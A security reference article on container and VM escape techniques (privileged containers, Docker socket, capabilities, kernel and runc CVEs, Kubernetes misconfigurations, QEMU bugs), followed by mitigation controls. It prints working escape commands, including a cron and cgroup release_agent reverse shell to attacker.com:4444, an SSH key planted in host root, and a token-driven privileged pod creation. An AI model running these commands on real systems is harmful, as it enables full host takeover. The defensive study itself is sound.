Escape Techniques — Container and VM Breakout

Category: Infrastructure Security — Isolation Bypass
MITRE ATT&CK: T1611 (Escape to Host), T1610 (Deploy Container)
Applies To: Docker, Kubernetes, runc, containerd, KVM, VMware ESXi, any multi-tenant compute environment

Overview

Escape techniques refer to methods by which an attacker who has code execution inside a container or VM breaks out of the isolation boundary to access the host OS, the hypervisor, or other co-tenants. Container escapes are significantly more common than VM escapes because containers share the host kernel — any kernel vulnerability or misconfiguration that grants elevated privileges can lead directly to host access.

At Google scale, container escapes represent a catastrophic failure of multi-tenancy. GKE uses gVisor (a Go-based kernel sandbox) and Container-Optimized OS (a minimal, read-only, hardened OS) specifically to increase the cost of container escape. Understanding the full range of escape techniques — from misconfiguration exploits to kernel CVEs — is essential for both building secure container infrastructure and for red-teaming it.

Container Escape Techniques

1. Privileged Container (--privileged / privileged: true)

A privileged container has all Linux capabilities and direct access to host devices. It can:
- Access /dev — mount the host filesystem
- Load kernel modules
- Manipulate host network interfaces
- Interact with cgroups directly

# Inside a privileged container, escape to host:
# Find the host root filesystem device
ls /dev/sd*   # or /dev/xvda, /dev/vda

# Mount host root filsystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Write an SSH key to host root's authorized_keys
mkdir -p /mnt/host/root/.ssh
echo "ssh-ed25519 AAAA...attacker_key" >> /mnt/host/root/.ssh/authorized_keys

# Or: write a cron job that runs a reverse shell
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /mnt/host/etc/cron.d/backdoor

2. Docker Socket Mount (/var/run/docker.sock)

If the container has access to the Docker socket, it can control the Docker daemon directly — including creating new privileged containers with host mounts.

# Inside container with Docker socket access
docker run -v /:/host --rm -it alpine chroot /host bash
# Now running as root on the host filesystem

This is a complete host escape. The Docker socket must never be mounted in an untrusted container.

3. Dangerous Linux Capabilities

Capability Escape Vector
CAP_SYS_ADMIN Mount filesystems, manipulate namespaces, load kernel modules → near-equivalent to privileged
CAP_NET_ADMIN Modify routing tables, intercept network traffic
CAP_SYS_PTRACE ptrace any process; can attach to host processes if PID namespace is shared
CAP_SYS_MODULE Load kernel modules directly → kernel backdoor
CAP_DAC_READ_SEARCH Read any file regardless of permissions → read host secrets
CAP_SETUID / CAP_SETGID Change UID to root; manipulate setuid binaries

CAP_SYS_ADMIN escape technique:

# Mount cgroup filesystem to create a release_agent escape
mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgroup/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /cmd && chmod a+x /cmd
echo 0 > /tmp/cgroup/x/cgroup.procs  # triggers release_agent as root on host

4. Kernel CVE Exploitation

Since containers share the host kernel, any kernel privilege escalation CVE exploitable from an unprivileged process can be used to escape. Key historical examples:

CVE Description Affected
CVE-2022-0847 (Dirty Pipe) Write to read-only files via pipe splice; overwrite arbitrary host files from container Linux 5.8–5.16
CVE-2016-5195 (Dirty COW) Race condition in copy-on-write; write to read-only memory-mapped files Linux < 4.8.3
CVE-2019-5736 (runc) runc binary overwrite via /proc/self/exe during container exec runC, Docker, K8s
CVE-2020-15257 (Containerd) UNIX socket in shared network namespace allows escape from container containerd < 1.3.9
CVE-2021-30465 (runc) TOCTOU race during mount; symlink to escape rootfs runC < 1.0.0-rc95
CVE-2022-23648 containerd image extraction; path traversal to write host files containerd < 1.6.1

5. Kubernetes-Specific Misconfigurations

Misconfiguration Escape Vector
hostPID: true Share host PID namespace; attach to host processes via ptrace
hostNetwork: true Access host network; reach node metadata service directly
hostPath volume mount Mount /, /etc, /var/run/docker.sock, /proc directly
Over-privileged service account SA token can create pods with privileged: true
No PodSecurityAdmission Any pod manifest can request privileged capabilities
Unrestricted imagePullPolicy Pull from untrusted registries with malicious images

K8s SA token lateral movement to escape:

# Inside a compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# Call API server to create a privileged pod
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"escape"},"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"c","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'

VM Escape Techniques

1. Hypervisor Device Emulation Vulnerabilities (QEMU)

The primary VM escape vector. QEMU emulates hardware devices (NIC, disk, USB) for VMs:

CVE Component Description
CVE-2015-3456 (VENOM) QEMU FDC (floppy controller) Heap overflow in floppy controller emulation; code exec in hypervisor
CVE-2019-14378 QEMU SLiRP Heap overflow in IPv6 packet reassembly
CVE-2021-3930 QEMU SCSI Stack overflow in SCSI device emulation
CVE-2022-26353 QEMU virtio-net Memory disclosure in virtio-net Rx path

VENOM (CVE-2015-3456) — the canonical VM escape:
Guest OS sends crafted floppy controller commands → triggers heap overflow in QEMU floppy emulation code running in hypervisor context → attacker writes shellcode to hypervisor heap → code execution as QEMU process on host.

2. Shared Memory / MMIO Abuse

VM maps a Memory-Mapped I/O region. Bugs in the hypervisor's MMIO handler allow a guest to corrupt hypervisor memory via crafted read/write sequences.

3. Virtual GPU and Passthrough Bugs

vGPU drivers in the guest can trigger bugs in kernel-level GPU virtualization code (NVIDIA vGPU, VGT+), leading to privilege escalation on the host.

Mitigation Controls

# Threat Mitigation Layer
1 Privileged container PodSecurityAdmission Restricted; deny privileged: true in admission controller K8s admission
2 Dangerous capabilities Drop all caps (drop: [ALL]); add only needed (e.g., NET_BIND_SERVICE) Pod securityContext
3 Docker socket access Never mount /var/run/docker.sock in containers; use socket proxies if needed Container config
4 Kernel CVE exploitation Use gVisor — intercepting syscalls with a separate kernel; keep host kernel patched Container runtime
5 hostPath mounts Prohibit arbitrary hostPath mounts; use ReadOnlyRootFilesystem Admission + securityContext
6 hostPID / hostNetwork Deny in admission policy except for DaemonSets with specific justification K8s admission
7 VM escape via QEMU Isolate QEMU in a sandbox (seccomp, AppArmor, SELinux); update QEMU regularly Hypervisor config
8 K8s SA token abuse Disable automounting; use Workload Identity instead Pod spec / IAM
9 Image supply chain Binary Authorization; sign and verify all images with Cosign/Sigstore Build pipeline
10 Cgroup release_agent Use cgroup v2; Linux 5.14+ restricts release_agent in user namespaces Kernel version

Top 3 Critical Mitigations

  1. PodSecurityAdmission Restricted profile — enforces runAsNonRoot, drops all capabilities, disables privileged containers, requires read-only root filesystem. This single control eliminates the most common container escape paths.
  2. gVisor as container runtime — gVisor intercepts all syscalls from the container before they reach the host kernel. Even if a container process has a kernel exploit payload, gVisor's separate kernel (Gofer + Sentry) means the host kernel never sees the attack.
  3. Patch kernel and container runtime urgently — Dirty Pipe, Dirty COW, runc CVEs are exploitable within hours of disclosure. Automated patching pipelines with rapid rollout on container hosts must treat kernel CVEs as P0 incidents.

Key Takeaways

  • Container escapes are the primary multi-tenant security risk in Kubernetes/container environments.
  • Privileged containers and Docker socket access are essentially full host access — never allow them in production.
  • The cgroup release_agent exploit is a classic kernel-level escape that works in older environments without proper seccomp/AppArmor.
  • VM escapes require hypervisor-level bugs (QEMU CVEs) and are rarer, but devastating when they occur.
  • gVisor adds a second isolation layer below containers that prevents most kernel exploitation paths.
  • Kubernetes misconfigurations (hostPID, hostPath, over-privileged service accounts) are more common escape paths than kernel CVEs in practice.
